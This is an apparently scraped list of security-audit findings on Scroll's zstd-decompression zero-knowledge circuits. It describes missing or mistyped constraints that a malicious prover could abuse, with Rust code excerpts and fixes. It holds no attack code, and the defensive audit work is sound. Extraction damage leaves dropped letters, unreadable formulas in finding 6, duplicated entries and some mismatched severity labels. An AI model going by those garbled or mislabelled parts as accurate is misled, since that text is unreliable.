        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The column s_back_ref_phase is not properly constrained to ensure the back-referencing phase is monotone once activated. The issue is likely due to a typo. Executing decoding sequences happens in phases: Literal copy and back-references. The two phases must not occur simultaneously. Furthermore, each phase must have a monotone behaviori.e., the literal copy phase (the back-referencing phase, respectively) remains deactivated (activated, respectively). The constraint in gure 6.1 is meant to ensure the monotonicity of the back referencing phase once activated. However, likely due to a typo, s_back_ref_phase_prev is constrained to be equal to 1 instead of s_back_ref_phase . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase_prev.expr(), 1. expr(), ); }, ); Figure 5.1: aggregator/src/aggregation/decoder/seq_exec.rs#L393L405 However, other constraints enforce that either a phase is activated or the current rows correspond to padding. But exploiting this issue appears dicult due to adjacent constraints. The monotonicity of the literal copy phase once deactivated is guaranteed by appropriate constraints. Therefore, to use arbitrary values in the column s_back_ref_phase , a malicious prover must produce a copy command that is compatible with the copied value. On the other hand, when no phase is activated, the current rows correspond to padding rows. An attacker could potentially abuse the ineective constraints to provide a shorter witness. It is unclear whether this approach is feasible and what impact such an attack may ultimately have on the overall system. Exploit Scenario An attacker notices the defective constraints and produces a false witness by exploiting the missing constraints for monotonicity on s_back_ref_phase . We could not fully determine the feasibility of producing malicious witnesses or whether monotonicity is fully guaranteed by adjacent constraints. Recommendations Short term, amend the code so that it constrains s_back_ref_phase to be equal to 1 instead of s_back_ref_phase_prev . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase.expr(), 1. expr(), ); }, ); Figure 5.2: An example x of the aforementioned issue Long term, review the codebase for potential variable typos and patterns that could render constraints void. Some examples of patterns to investigate include: comparing a variable with itself, subtracting a variable from itself, or naming conventions such as: (variable_name, variable_name_prev) .",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. The blob-based public input commitment scheme is poorly documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "To reduce the gas cost of verication, the Scroll team has moved some of the ZkEVMs public input data into the EIP-4844 blob structure, whereby the underlying data is stored only temporarily, at a lower gas cost. The verier contract has access only to a polynomial commitment to the blob data and evaluation proofs. Additionally, with the addition of the zstd circuits reviewed in this report, the data in the blob is instead in zstd-compressed form. When the ZkEVM verier is deployed in the Scroll rollup contract, a batch, consisting of both L1 and L2 transactions and associated metadata, is committed in the rollup contract. Committed batches can then either be reverted or nalized. To nalize a batch, a ZkEVM proof is checked against the metadata provided in the commit stage, and if the proof succeeds, the batch is nalized and can no longer be reverted. Since the ZkEVM prover should be untrusted in the system, the metadata in the commit stage must uniquely identify the transactions in the underlying batch; otherwise, the prover may be able to nalize a dierent sequence of transactions than was intended. Prior to EIP-4844 integration, the sequence of transactions in a chunk was fully determined by the public input hash of the ZkEVM circuit, which would then be combined together into an overall public input hash by the aggregation circuit. In this scheme, the unique identication is a straightforward consequence of the collision resistance of the hash used. However, the current scheme is more complex. The transactions are now split between this public input hash and the blob structure. The PI subcircuit of the ZkEVM splits the underlying sequence of transactions into L1 and L2 transactions. The L1 transactions are included in the public input hash, and the L2 transactions are included in the chunk tx hash. Unless there is some as-yet-unknown aw in the PI subcircuit, this guarantees the uniqueness of the L1 transactions as before. To commit to the L2 transactions, the overall public inputs of the aggregation circuit include a tuple (versionedHash,z,y) , representing the polynomial commitment to the blob and the evaluation that must be checked by the verier. To conclude that this uniquely identies a particular sequence of L2 transactions, we must determine that: is a unique polynomial corresponding to versionedHash ; is a unique polynomial corresponding to the L2 transaction 1. 2. 3.  (  )  (  ) , where , where  (  ) =   (  ) =  sequence;  both the L2 transaction sequence and versionedHash . is a pseudorandom challenge derived from a transcript including commitments to These three requirements suce because blobs represent degree-4096 polynomials over a 254-bit nite eld. The chance that point purpose of checking that for a randomly sampled as randomly sampled for the is negligible, and requirement (3) allows us to treat by the Fiat-Shamir heuristic.  (  )   (  )  (  ) =  (  )  (  ) =  (  ) and   Requirement (1) is ensured because the verier contract checks a point evaluation proof, and versionedHash is a hash of a KZG commitment, which uniquely determines  (  ) .  (  ) is more complicated, since the underlying The evaluation in requirement (2) is checked by the BarycentricEvaluationConfig circuit. However, the uniqueness of transaction data is not stored in the blob. Instead, the BatchDataConfig subcircuit of the aggregation circuit includes the whole L2 transaction sequence data as private witness values. The aggregation circuit checks those hashes against the chunk tx hash public inputs of the ZkEVM proofs being aggregated, and checks that the L2 transaction sequence is the result of zstd-decompressing the data used in the BarycentricEvaluationConfig circuit. To then establish that circuit is deterministic; and (b) that the serialization of the L2 transactions when computing the chunk tx hash is unique. is unique, we must assume (a) that the zstd decompression  (  ) Finally, requirement (3) is ensured by checking that the challenge can be computed as a hash of data that includes the versionedHash and the chunk tx hashes, via an internal lookup in the BatchDataConfig table, shown below in gure 6.1. // lookup challenge digest in keccak table. meta.lookup_any( \"BatchDataConfig (metadata/chunk_data/challenge digests in keccak table)\" , |meta| { let is_hash = meta.query_selector(config.hash_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // when is_boundary is set in the \"digest RLC\" section. // this is also the last row of the \"digest RLC\" section. let cond = is_hash * is_boundary; // - metadata_digest: 32 bytes // - chunk[i].chunk_data_digest: 32 bytes each // - versioned_hash: 32 bytes let preimage_len = 32. expr() * (N_SNARKS + 1 + 1 ).expr(); [ 1. expr(), 1. expr(), meta.query_advice(config.preimage_rlc, Rotation::cur()), // input rlc // input len preimage_len, // output rlc meta.query_advice(config.digest_rlc, Rotation::cur()), // q_enable // is final ] .into_iter() .zip_eq(keccak_table.table_exprs(meta)) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.1: Lookups from the chunk_data section of the table to the challenge section of the table ( zkevm-circuits/aggregator/src/aggregation/batch_data.rs#334362 ) All of these properties appear to hold; however, they are neither explicitly stated nor explicitly justied in Scrolls documentation. If any of them fails, it would allow a malicious prover to nalize a dierent batch of transactions than was committed, causing many potential issues such as denial of service or state divergence. Recommendations Short term, document this commitment scheme and specify what properties of dierent components it relies upon (e.g., deterministic decompression). Long term, explicitly document all intended security properties of the Scroll rollup, and what is required of each system component to ensure those properties.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "7. Left shift leads to undened behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The read_variable_bit_packing function accepts both an oset parameter and a maximum value, r , indicating the maximum value to be returned. The r parameter is specied as a u64. The number of bits required to store the decoded value is computed using a left shift with a variable shift size (see gure 7.1) from the function bit_length . // number of bits required to fit a value in the range 0..=r. let size = bit_length(r) as u32; let max = 1 << size; Figure 7.1: Calculating bit storage requirements from the range value r ( zkevm-circuits/aggregator/src/aggregation/decoder/witgen/util.rs#2324 ) If the top bit of r is set, the bit_length function will return 64. This shift is equal to the bit length of the max variable, leading to undened behavior . When compiled in debug mode, this should lead to a panic, but in release mode, the behavior is unspecied and can vary from platform to platform. On x86-64 processors, shift lengths are bit masked against 0x3f , meaning that 64 will reduce to zero, so max will be equal to 1. Other platforms may shift the one o the end, causing max to be 0. Additionally, on a platform where 1 == 1 << 64 , using the value u64::MAX for r will result in the check for non-variable bit packing to fail, leading to potential decoding errors. Recommendations Short term, add checks to specically handle the case where r is 64 bits long, whether through expanded handling or by explicitly rejecting values of r that can trigger this behavior. Long term, develop tests that integrate edge cases and validate correct handling. If r is restricted to values that will not trigger this edge case, ensure that this is clearly and conspicuously documented.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Missing constraints for Block_Maximum_Size ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The zstd specication document states that the Block_Size value should be bounded by Block_Maximum_Size , which is the smallest of Window_Size , or 128 KB. In Scroll's zstd encoded blobs, the Single_Segment_flag is set, so Window_Size should equal Frame_Content_Size according to the specication. Figure 8.1: Zstd specication dening how the Block_Size should be validated However, the constraints named DecoderConfig: tag BlockHeader (Block_Size) do not check that the Block_Size value is limited by the smallest value between Frame_Content_Size and 128KB. // block_size == block_header >> 3 // // i.e. block_header - (block_size * (2^3)) < 8 let block_header_lc = meta.query_advice(config.byte, Rotation( 2 )) * 65536. expr() + meta.query_advice(config.byte, Rotation( 1 )) * 256. expr() + meta.query_advice(config.byte, Rotation( 0 )); let block_size = meta.query_advice(config.block_config.block_len, Rotation::cur()); let diff = block_header_lc - (block_size * 8. expr()); vec! [(condition * diff, config.range8.into())] }); Figure 8.1: aggregator/src/aggregation/decoder.rs#L1833L1843 Exploit Scenario A malicious prover generates a proof for a zstd blob that does not follow the specication. Due to the missing constraint, the verier still accepts the proof as valid. Recommendations Short term, add the necessary constraint that ensures the correct validation of the BlockSize value. Long term, add positive and negative tests that parse and validate the BlockHeader according to the specication.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Apparent discrepancy between bitwise-op-table conguration and code comment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The implementation and conguration of the bitwise_op_table are misleading, as the tables generic parameter does not match the code comment. The BitwiseOpTable structure uses generic arguments to congure which operation it implements. /// Bitwise operation table ( AND only) bitwise_op_table: BitwiseOpTable < 1 , L, R>, Figure 9.1: aggregator/src/aggregation/decoder.rs#L88L89 However, the code comment states that the table should be for the bitwise-and operation, but the generic parameter of 1 corresponds to the bitwise-or operation in the BitwiseOp structure: #[derive(Clone, Copy, Debug)] /// Bitwise operation types. pub enum BitwiseOp { /// AND AND = 0 , /// OR OR, /// XOR XOR, } impl_expr!(BitwiseOp); /// Lookup table for bitwise AND/OR/XOR operations. #[derive(Clone, Copy, Debug)] pub struct BitwiseOpTable < const OP_CHOICE: usize , const RANGE_L: usize , const RANGE_R: usize > { /// Denotes op: AND == 0, OR == 1, XOR == 2. pub op: Column <Fixed>, /// Denotes the left operand. pub lhs: Column <Fixed>, /// Denotes the right operand. pub rhs: Column <Fixed>, /// Denotes the bitwise operation on lhs and rhs. pub output: Column <Fixed>, Figure 9.2: zkevm-circuits/src/table.rs#L3270L3294 Despite this, the actual implementation is correct as an OP_CHOICE of 1 corresponds to the BitwiseOp::AND variant: /// Assign values to the BitwiseOp table. pub fn load <F: Field >(& self , layouter: & mut impl Layouter<F>) -> Result <(), Error> { layouter.assign_region( || \"BitwiseOp table\" , | mut region| { let mut offset = 0 ; let chosen_ops = match OP_CHOICE { 1 => vec! [BitwiseOp::AND] , 2 => vec! [BitwiseOp::OR], 3 => vec! [BitwiseOp::XOR], Figure 9.3: zkevm-circuits/src/table.rs#L3310L3319 Recommendations Short term, unify the representations and use enum variants in the generic arguments to clarify the implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "10. The compression mode reserved eld is not enforced to equal zero ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The symbol compression mode specication states that the rst two bits, corresponding to the Reserved eld, \"must be all-zeroes.\" However, the implementation does not constrain these witness values to be zero. Figure 10.1: Zstd specication stating that the Reserved eld should be zero Figure 10.2 shows how the bits at positions 7 to 2 are constrained, but no constraints exist for the bits at positions 1 and 0. let comp_mode_bit0_ll = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 6 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 6 ], Rotation( 2 )), meta.query_advice(bits[ 6 ], Rotation( 3 )), ), ); let comp_mode_bit1_ll = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 7 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 7 ], Rotation( 2 )), meta.query_advice(bits[ 7 ], Rotation( 3 )), ), ); let comp_mode_bit0_om = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 4 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 4 ], Rotation( 2 )), meta.query_advice(bits[ 4 ], Rotation( 3 )), ), ); let comp_mode_bit1_om = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 5 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 5 ], Rotation( 2 )), meta.query_advice(bits[ 5 ], Rotation( 3 )), ), ); let comp_mode_bit0_ml = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 2 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 2 ], Rotation( 2 )), meta.query_advice(bits[ 2 ], Rotation( 3 )), ), ); let comp_mode_bit1_ml = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 3 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 3 ], Rotation( 2 )), meta.query_advice(bits[ 3 ], Rotation( 3 )), ), Figure 10.2: aggregator/src/aggregation/decoder.rs#L378L433 Exploit Scenario A malicious prover generates a proof for a zstd blob that does not follow the specication. Due to the missing constraint, the verier still accepts the proof as valid. Recommendations Short term, add the necessary require_zero constraints to ensure that decoding is compliant with the specication. Long term, add positive and negative tests for all edge cases in the specication.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. The tag_cong.is_change witness is partially unconstrained ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The constraints for the tag_config.is_change witness are not immediately obvious, making it dicult for the reader to know if it is correctly constrained. The tag_config.is_change witness is constrained to be true whenever byte_idx_delta && tag_idx_eq_tag_len_prev holds. However, this implies only that these two conditions are sucient for is_change to be true, where if the conditions are met, then is_change == true . cb.condition(and::expr([byte_idx_delta, tag_idx_eq_tag_len_prev]), |cb| { cb.require_equal( \"is_change is set\" , meta.query_advice(config.tag_config.is_change, Rotation::cur()), 1. expr(), ); }); Figure 11.1: aggregator/src/aggregation/decoder.rs#L1322L1328 The constraint for the necessary part is constrained only later, where is_change == true implies the two conditions. meta.create_gate( \"DecoderConfig: new tag\" , |meta| { let condition = and::expr([ meta.query_fixed(config.q_enable, Rotation::cur()), meta.query_advice(config.tag_config.is_change, Rotation::cur()), ]); let mut cb = BaseConstraintBuilder::default(); // The previous tag was processed completely. cb.require_equal( \"tag_idx::prev == tag_len::prev\" , meta.query_advice(config.tag_config.tag_idx, Rotation::prev()), meta.query_advice(config.tag_config.tag_len, Rotation::prev()), ); // Tag change also implies that the byte_idx transition did happen. cb.require_equal( \"byte_idx::prev + 1 == byte_idx::cur\" , meta.query_advice(config.byte_idx, Rotation::prev()) + 1. expr(), meta.query_advice(config.byte_idx, Rotation::cur()), ); Figure 11.2: aggregator/src/aggregation/decoder.rs#L1358L1378 Exploit Scenario A malicious prover can control the is_change witness when its value should be zero. By setting it to one when it should be zero, a malicious prover could bypass constraints related to ZstdBlockSequenceFseCode because they are constrained by not(tag_config.is_change) : meta.create_gate( \"DecoderConfig: tag ZstdBlockSequenceFseCode (other rows)\" , |meta| { let condition = and::expr([ meta.query_fixed(q_enable, Rotation::cur()), meta.query_advice(config.tag_config.is_fse_code, Rotation::cur()), not::expr(meta.query_advice(config.tag_config.is_change, Rotation::cur())) , not::expr( meta.query_advice(config.fse_decoder.is_trailing_bits, Rotation::cur()), ), ]); Figure 11.3: aggregator/src/aggregation/decoder.rs#22302240 A malicious prover could also bypass lookups into the VariableBitPacking table: meta.lookup_any( \"DecoderConfig: tag ZstdBlockSequenceFseCode (variable bit-packing)\" , |meta| { // At every row where a non-nil bitstring is read: // - except the AL bits (is_change=true) // - except when we are in repeat-bits loop // - except the trailing bits (if they exist) let condition = and::expr([ meta.query_fixed(config.q_enable, Rotation::cur()), meta.query_advice(config.tag_config.is_fse_code, Rotation::cur()), config.bitstream_decoder.is_not_nil(meta, Rotation::cur()), not::expr(meta.query_advice(config.tag_config.is_change, Rotation::cur())), not::expr( meta.query_advice(config.fse_decoder.is_repeat_bits_loop, Rotation::cur()), ), not::expr( meta.query_advice(config.fse_decoder.is_trailing_bits, Rotation::cur()), ), ]); [...] let range = table_size - probability_acc + 1. expr(); [ FixedLookupTag::VariableBitPacking.expr(), range, value_read, value_decoded, num_bits, 0. expr(), 0. expr(), ] .into_iter() .zip_eq(config.fixed_table.table_exprs(meta)) .map(|(arg, table)| (condition.expr() * arg, table)) .collect() }, ); Figure 11.4: aggregator/src/aggregation/decoder.rs#25522597 There are several other variables whose constraint soundness depends on the soundness of tag_config.is_change , meaning an accidental change in these two necessary and sucient conditions may undermine the security of many circuit components. Recommendations Short term, document where the necessary and sucient checks are performed, and therefore, constraints for is_change == false are not needed. 12. The is_llt/is_mot/is_mlt constraints are only valid if self.table_kind is in {1, 2, 3} Severity: High Diculty: High Type: Data Validation Finding ID: TOB-SCROLLZSTD-12 Target: aggregator/src/aggregation/decoder.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "13. Values larger than 23 satisfy the \"spans_three_bytes\" constraints ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The spans_three_bytes function should constrain the bit_index_end witness to lie in the [16, 23] interval. However, it accepts a value as long as bit_index_end > 15 . In particular, values larger than 23 will satisfy the constraint. /// A bitstring spans 3 bytes if the bit_index at which it ends is such that: /// - 16 <= bit_index_end <= 23. fn spans_three_bytes (& self , meta: & mut VirtualCells<Fr>, at: Rotation ) -> Expression <Fr> { let lhs = meta.query_advice( self .bit_index_end, at); let (lt2, eq2) = self .bit_index_end_cmp_15.expr_at(meta, at, lhs, 15. expr()); not::expr(lt2 + eq2) } Figure 13.1: aggregator/src/aggregation/decoder.rs#L637L643 In practice, this issue is unexploitablethus the informational severitybecause the current BitstringTable implementation does not support bitstrings spanning more than three bytes. However, we still highly recommend correctly constraining the bit_index_end witness: if the bitstream decoder starts supporting more than three bytes in the future, the missing constraint would cause soundness issues. Recommendations Short term, add a constraint enforcing that the bit_index_end witness is smaller than 24.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. RomTagTransition table does not allow ZstdBlockSequenceHeader -> BlockHeader transitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The RomTagTransition table does not allow transitioning from ZstdBlockSequenceHeader to BlockHeader . This causes a completeness issue where honestly generated compressed data does not satisfy the tag transition circuit. Figure 4.1 shows the allowed transitions and highlights the transitions that reach BlockHeader  none originate from ZstdBlockSequenceHeader : [ ] (FrameHeaderDescriptor, FrameContentSize), (FrameContentSize, BlockHeader ), (BlockHeader, ZstdBlockLiteralsHeader), (ZstdBlockLiteralsHeader, ZstdBlockLiteralsRawBytes), (ZstdBlockLiteralsRawBytes, ZstdBlockSequenceHeader), (ZstdBlockSequenceHeader, ZstdBlockSequenceFseCode), (ZstdBlockSequenceHeader, ZstdBlockSequenceData), (ZstdBlockSequenceFseCode, ZstdBlockSequenceFseCode), (ZstdBlockSequenceFseCode, ZstdBlockSequenceData), (ZstdBlockSequenceData, BlockHeader ), // multi-block (ZstdBlockSequenceData, Null), (Null, Null), Figure 4.1: aggregator/src/aggregation/decoder/tables/fixed/tag_transition.rs#L28L4 1 However, in the specication, the ZstdBlockSequenceHeader to BlockHeader transition is described and has associated constraints: Figure 4.2: Circuit specication where a ZstdBlockSequenceHeader to BlockHeader transition is mentioned Figure 4.3 shows the implementation of the constraint from gure 4.2: cb.condition(is_prev_sequence_header(meta), |cb| { cb.require_equal( \"tag::prev=SeqHeader\" , config .block_config .is_empty_sequences(meta, Rotation::prev()), 1. expr(), ); }); Figure 4.3: aggregator/src/aggregation/decoder.rs#18071815 Exploit Scenario A two-block encoded data, where the rst block contains no sequences to decode, is honestly generated by the zstd compression algorithm. However, due to the missing transition, this compressed data does not satisfy the decoder circuit. Recommendations Short term, allow for the ZstdBlockSequenceHeader to BlockHeader transition to occur in the tag transition circuit, or document why this is not allowed. Long term, add tests with zstd compressed data that exercise all possible valid tag transitions. 5. The back referencing phase is not properly constrained to a monotone behavior once activated Severity: Undetermined Diculty: Low Type: Cryptography Finding ID: TOB-SCROLLZSTD-5 Target: aggregator/src/aggregation/decoder/seq_exec.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. The back referencing phase is not properly constrained to a monotone behavior once activated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The column s_back_ref_phase is not properly constrained to ensure the back-referencing phase is monotone once activated. The issue is likely due to a typo. Executing decoding sequences happens in phases: Literal copy and back-references. The two phases must not occur simultaneously. Furthermore, each phase must have a monotone behaviori.e., the literal copy phase (the back-referencing phase, respectively) remains deactivated (activated, respectively). The constraint in gure 6.1 is meant to ensure the monotonicity of the back referencing phase once activated. However, likely due to a typo, s_back_ref_phase_prev is constrained to be equal to 1 instead of s_back_ref_phase . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase_prev.expr(), 1. expr(), ); }, ); Figure 5.1: aggregator/src/aggregation/decoder/seq_exec.rs#L393L405 However, other constraints enforce that either a phase is activated or the current rows correspond to padding. But exploiting this issue appears dicult due to adjacent constraints. The monotonicity of the literal copy phase once deactivated is guaranteed by appropriate constraints. Therefore, to use arbitrary values in the column s_back_ref_phase , a malicious prover must produce a copy command that is compatible with the copied value. On the other hand, when no phase is activated, the current rows correspond to padding rows. An attacker could potentially abuse the ineective constraints to provide a shorter witness. It is unclear whether this approach is feasible and what impact such an attack may ultimately have on the overall system. Exploit Scenario An attacker notices the defective constraints and produces a false witness by exploiting the missing constraints for monotonicity on s_back_ref_phase . We could not fully determine the feasibility of producing malicious witnesses or whether monotonicity is fully guaranteed by adjacent constraints. Recommendations Short term, amend the code so that it constrains s_back_ref_phase to be equal to 1 instead of s_back_ref_phase_prev . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase.expr(), 1. expr(), ); }, ); Figure 5.2: An example x of the aforementioned issue Long term, review the codebase for potential variable typos and patterns that could render constraints void. Some examples of patterns to investigate include: comparing a variable with itself, subtracting a variable from itself, or naming conventions such as: (variable_name, variable_name_prev) . 6. The blob-based public input commitment scheme is poorly documented Severity: Informational Diculty: N/A Type: Cryptography Finding ID: TOB-SCROLLZSTD-6 Target: aggregator/",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. The blob-based public input commitment scheme is poorly documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "To reduce the gas cost of verication, the Scroll team has moved some of the ZkEVMs public input data into the EIP-4844 blob structure, whereby the underlying data is stored only temporarily, at a lower gas cost. The verier contract has access only to a polynomial commitment to the blob data and evaluation proofs. Additionally, with the addition of the zstd circuits reviewed in this report, the data in the blob is instead in zstd-compressed form. When the ZkEVM verier is deployed in the Scroll rollup contract, a batch, consisting of both L1 and L2 transactions and associated metadata, is committed in the rollup contract. Committed batches can then either be reverted or nalized. To nalize a batch, a ZkEVM proof is checked against the metadata provided in the commit stage, and if the proof succeeds, the batch is nalized and can no longer be reverted. Since the ZkEVM prover should be untrusted in the system, the metadata in the commit stage must uniquely identify the transactions in the underlying batch; otherwise, the prover may be able to nalize a dierent sequence of transactions than was intended. Prior to EIP-4844 integration, the sequence of transactions in a chunk was fully determined by the public input hash of the ZkEVM circuit, which would then be combined together into an overall public input hash by the aggregation circuit. In this scheme, the unique identication is a straightforward consequence of the collision resistance of the hash used. However, the current scheme is more complex. The transactions are now split between this public input hash and the blob structure. The PI subcircuit of the ZkEVM splits the underlying sequence of transactions into L1 and L2 transactions. The L1 transactions are included in the public input hash, and the L2 transactions are included in the chunk tx hash. Unless there is some as-yet-unknown aw in the PI subcircuit, this guarantees the uniqueness of the L1 transactions as before. To commit to the L2 transactions, the overall public inputs of the aggregation circuit include a tuple (versionedHash,z,y) , representing the polynomial commitment to the blob and the evaluation that must be checked by the verier. To conclude that this uniquely identies a particular sequence of L2 transactions, we must determine that: is a unique polynomial corresponding to versionedHash ; is a unique polynomial corresponding to the L2 transaction 1. 2. 3.  (  )  (  ) , where , where  (  ) =   (  ) =  sequence;  both the L2 transaction sequence and versionedHash . is a pseudorandom challenge derived from a transcript including commitments to These three requirements suce because blobs represent degree-4096 polynomials over a 254-bit nite eld. The chance that point purpose of checking that for a randomly sampled as randomly sampled for the is negligible, and requirement (3) allows us to treat by the Fiat-Shamir heuristic.  (  )   (  )  (  ) =  (  )  (  ) =  (  ) and   Requirement (1) is ensured because the verier contract checks a point evaluation proof, and versionedHash is a hash of a KZG commitment, which uniquely determines  (  ) .  (  ) is more complicated, since the underlying The evaluation in requirement (2) is checked by the BarycentricEvaluationConfig circuit. However, the uniqueness of transaction data is not stored in the blob. Instead, the BatchDataConfig subcircuit of the aggregation circuit includes the whole L2 transaction sequence data as private witness values. The aggregation circuit checks those hashes against the chunk tx hash public inputs of the ZkEVM proofs being aggregated, and checks that the L2 transaction sequence is the result of zstd-decompressing the data used in the BarycentricEvaluationConfig circuit. To then establish that circuit is deterministic; and (b) that the serialization of the L2 transactions when computing the chunk tx hash is unique. is unique, we must assume (a) that the zstd decompression  (  ) Finally, requirement (3) is ensured by checking that the challenge can be computed as a hash of data that includes the versionedHash and the chunk tx hashes, via an internal lookup in the BatchDataConfig table, shown below in gure 6.1. // lookup challenge digest in keccak table. meta.lookup_any( \"BatchDataConfig (metadata/chunk_data/challenge digests in keccak table)\" , |meta| { let is_hash = meta.query_selector(config.hash_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // when is_boundary is set in the \"digest RLC\" section. // this is also the last row of the \"digest RLC\" section. let cond = is_hash * is_boundary; // - metadata_digest: 32 bytes // - chunk[i].chunk_data_digest: 32 bytes each // - versioned_hash: 32 bytes let preimage_len = 32. expr() * (N_SNARKS + 1 + 1 ).expr(); [ 1. expr(), 1. expr(), meta.query_advice(config.preimage_rlc, Rotation::cur()), // input rlc // input len preimage_len, // output rlc meta.query_advice(config.digest_rlc, Rotation::cur()), // q_enable // is final ] .into_iter() .zip_eq(keccak_table.table_exprs(meta)) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.1: Lookups from the chunk_data section of the table to the challenge section of the table ( zkevm-circuits/aggregator/src/aggregation/batch_data.rs#334362 ) All of these properties appear to hold; however, they are neither explicitly stated nor explicitly justied in Scrolls documentation. If any of them fails, it would allow a malicious prover to nalize a dierent batch of transactions than was committed, causing many potential issues such as denial of service or state divergence. Recommendations Short term, document this commitment scheme and specify what properties of dierent components it relies upon (e.g., deterministic decompression). Long term, explicitly document all intended security properties of the Scroll rollup, and what is required of each system component to ensure those properties. 7. Left shift leads to undened behavior Severity: Low Diculty: Low Type: Undened Behavior Finding ID: TOB-SCROLLZSTD-7 Target: aggregator/src/aggregation/decoder/witgen/util.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "12. The is_llt/is_mot/is_mlt constraints are only valid if self.table_kind is in {1, 2, 3} ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "The implementation of the is_llt , is_mot and is_mlt functions relies on the table_kind witness being in the set {1, 2, 3} . It is not immediately clear from the implementation that the table_kind variable is constrained to that set. Upon reporting this nding, the Scroll team identied that the table_kind witness is unconstrained on a trailing bits row. Without this constraint, a malicious prover can set an incorrect table_kind and then set the next table_kind value incorrectly (by essentially skipping one step). impl FseDecoder { fn is_llt (& self , meta: & mut VirtualCells<Fr>, rotation: Rotation ) -> Expression <Fr> { let table_kind = meta.query_advice( self .table_kind, rotation); let invert_of_2 = Fr::from( 2 ).invert().expect( \"infallible\" ); (FseTableKind::MLT.expr() - table_kind.expr()) * (FseTableKind::MOT.expr() - table_kind.expr()) * invert_of_2 } fn is_mot (& self , meta: & mut VirtualCells<Fr>, rotation: Rotation ) -> Expression <Fr> { let table_kind = meta.query_advice( self .table_kind, rotation); (table_kind.expr() - FseTableKind::LLT.expr()) * (FseTableKind::MLT.expr() - table_kind.expr()) } fn is_mlt (& self , meta: & mut VirtualCells<Fr>, rotation: Rotation ) -> Expression <Fr> { let table_kind = meta.query_advice( self .table_kind, rotation); let invert_of_2 = Fr::from( 2 ).invert().expect( \"infallible\" ); (table_kind.expr() - FseTableKind::LLT.expr()) * (table_kind.expr() - FseTableKind::MOT.expr()) * invert_of_2 } Figure 12.1: aggregator/src/aggregation/decoder.rs#L747L768 There are lookups into tables that correctly constrain table_kind , such as the lookup into the PredefinedFse table: // For predefined FSE 